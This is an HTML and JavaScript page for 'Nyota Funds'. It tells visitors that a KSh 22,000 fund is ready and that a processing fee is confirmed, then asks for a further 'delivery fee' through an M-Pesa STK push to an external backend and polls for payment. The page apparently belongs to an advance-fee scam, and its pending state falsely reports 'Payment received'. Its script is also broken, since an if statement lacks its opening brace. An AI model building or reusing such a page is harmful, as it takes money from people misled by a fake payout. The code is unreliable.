<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Select Pay Delivery Charges - Nyota Funds</title>

<style>

body{
    font-family:Arial,sans-serif;
    background:#f5f7fb;
    margin:0;
    padding:10px;
}

.container{
    max-width:430px;
    margin:auto;
    background:white;
    padding:15px;
    border-radius:18px;
    box-shadow:0 5px 15px rgba(0,0,0,0.1);
    text-align:center;
}

h2{
    color:#1b5e20;
    font-size:21px;
    margin:5px 0 12px;
}

.success-box{
    background:#e8f5e9;
    color:#1b5e20;
    padding:12px;
    border-radius:12px;
    font-size:14px;
    margin-bottom:10px;
}

.confirm-box{
    background:#f1f8e9;
    color:#2e7d32;
    padding:10px;
    border-radius:12px;
    font-size:14px;
    margin-bottom:12px;
}

.details-box{
    background:#fafafa;
    padding:12px;
    border-radius:12px;
    text-align:left;
    font-size:14px;
}

.details-box p{
    margin:8px 0;
}

.method{
    border:1px solid #ddd;
    padding:10px;
    border-radius:10px;
    margin-top:8px;
}

.method input{
    margin-right:8px;
}

.fee{
    font-weight:bold;
    color:#1b5e20;
}

button{
    width:100%;
    padding:14px;
    margin-top:12px;
    border:none;
    border-radius:10px;
    background:#1565c0;
    color:white;
    font-size:16px;
    font-weight:bold;
}

button:disabled{
    background:#999;
}

#status{
    margin-top:10px;
    font-size:14px;
    color:#555;
}

.secure{
    font-size:13px;
    color:#777;
    margin-top:10px;
}

</style>

</head>

<body>

<div class="container">

<h2>Select Pay Delivery Charges</h2>

<div class="success-box">

Great news 🎉 <br>

Your NYOTA FUNDS is ready for delivery

</div>

<div class="confirm-box">

✅ Processing fee confirmed

</div>

<div class="details-box">

<p>
<b>NYOTA FUND:</b> KSh 22,000
</p>

<p>
<b>Full Name:</b>
<span id="fullName">Loading...</span>
</p>

<p>
<b>Phone Number:</b>
<span id="phoneNumber">Loading...</span>
</p>

<b>Select Delivery Method</b>

<div class="method">

<label>

<input
type="radio"
name="delivery"
value="2"
onclick="updateFee()"
>

Safaricom M-Pesa — KSh 2

</label>

</div>

<div class="method">

<label>

<input
type="radio"
name="delivery"
value="550"
onclick="updateFee()"
>

Bank Account — KSh 550

</label>

</div>

<p class="fee">

Delivery Fee:
KSh <span id="deliveryFee">--</span>

</p>

</div>

<button id="payButton" onclick="payDelivery()">

Pay Delivery Charges

</button>

<div id="status"></div>

<p class="secure">

🔒 Secure STK Push • Instant Confirmation

</p>

</div>


<script>

// ==========================================
// LOAD APPLICANT DETAILS
// ==========================================

document.getElementById("fullName").innerText =
localStorage.getItem("fullName") || "Applicant";

document.getElementById("phoneNumber").innerText =
localStorage.getItem("phoneNumber") || "07XXXXXXXX";


// ==========================================
// UPDATE DELIVERY FEE
// ==========================================

function updateFee(){

    const selected =
        document.querySelector(
            'input[name="delivery"]:checked'
        );

    if(selected){

        document.getElementById("deliveryFee").innerText =
            selected.value;

    }

}


// ==========================================
// PAY DELIVERY
// ==========================================

async function payDelivery(){

    const selected =
        document.querySelector(
            'input[name="delivery"]:checked'
        );

    if(!selected){

        alert("Please select delivery method.");

        return;
    }


    const phone =
        localStorage.getItem("phoneNumber");


    if(!phone){

        alert("Phone number not found.");

        return;
    }


    const amount =
        Number(selected.value);


    const status =
        document.getElementById("status");


    const button =
        document.getElementById("payButton");


    button.disabled = true;

    button.innerText =
        "Processing...";


    status.innerText =
        "Sending STK Push...";


    try{

        const response =
            await fetch(
                "https://nyota-funds-backend.onrender.com/stk-push",
                {
                    method:"POST",

                    headers:{
                        "Content-Type":"application/json"
                    },

                    body:JSON.stringify({
                        phone:phone,
                        amount:amount
                    })
                }
            );


        const data =
            await response.json();


        console.log(
            "STK RESPONSE:",
            data
        );


        if(!response.ok){

            throw new Error(
                data.message ||
                "STK Push failed"
            );

        }


        // ==================================
        // GET PAYLOR TRANSACTION ID
        // ==================================

        const transactionId =
            data.transactionId ||
            data.checkout_request_id ||
            data.data?.transactionId ||
            data.data?.checkout_request_id;


        if(!transactionId){

            console.error(
                "No transaction ID found:",
                data
            );

            throw new Error(
                "Payment reference was not returned."
            );

        }


        console.log(
            "PAYMENT ID:",
            transactionId
        );


        status.innerText =
            "📱 STK Push sent. Please enter your M-PESA PIN.";


        // Start checking payment

        checkPayment(transactionId);


    }catch(error){

        console.error(
            "STK ERROR:",
            error
        );


        button.disabled = false;

        button.innerText =
            "Pay Delivery Charges";


        status.innerText =
            "❌ Failed to send STK Push.";

    }

}


// ==========================================
// CHECK PAYMENT STATUS
// ==========================================

function checkPayment(transactionId){

    console.log(
        "Checking payment:",
        transactionId
    );


    const interval =
        setInterval(async()=>{

            try{

                const response =
                    await fetch(
                        "https://nyota-funds-backend.onrender.com/payment-status",
                        {
                            method:"POST",

                            headers:{
                                "Content-Type":"application/json"
                            },

                            body:JSON.stringify({

                                checkout_request_id:
                                    transactionId,

                                transactionId:
                                    transactionId,

                                transaction_id:
                                    transactionId

                            })
                        }
                    );


                const result =
                    await response.json();


                console.log(
                    "PAYMENT STATUS:",
                    result
                );


                // ==================================
                // COMPLETED
                // ==================================

                const paymentStatus =
    String(
        result.status ||
        result.data?.status ||
        result.data?.data?.status ||
        ""
    ).toLowerCase();

if(
    paymentStatus === "completed" ||
    paymentStatus === "success"
)

                    clearInterval(interval);


                    document.getElementById("status").innerText =
                        "✅ Delivery charges paid successfully.";


                    setTimeout(()=>{

                        window.location.href =
                            "success.html";

                    },1000);


                }


                // ==================================
                // CANCELLED
                // ==================================

                else if(
                    result.status === "cancelled" ||
                    result.status === "CANCELLED"
                ){

                    clearInterval(interval);


                    document.getElementById("status").innerText =
                        "❌ Payment cancelled.";


                    document.getElementById("payButton").disabled =
                        false;


                    document.getElementById("payButton").innerText =
                        "Pay Delivery Charges";

                }


                // ==================================
                // FAILED
                // ==================================

                else if(
                    result.status === "failed" ||
                    result.status === "FAILED"
                ){

                    clearInterval(interval);


                    document.getElementById("status").innerText =
                        "❌ Payment failed.";


                    document.getElementById("payButton").disabled =
                        false;


                    document.getElementById("payButton").innerText =
                        "Pay Delivery Charges";

                }


                // ==================================
                // PENDING
                // ==================================

                else{

                    document.getElementById("status").innerText =
                        "⏳ Payment received. Confirming payment...";

                }


            }catch(error){

                console.error(
                    "STATUS ERROR:",
                    error
                );

            }

        },3000);

}

</script>

</body>
</html>
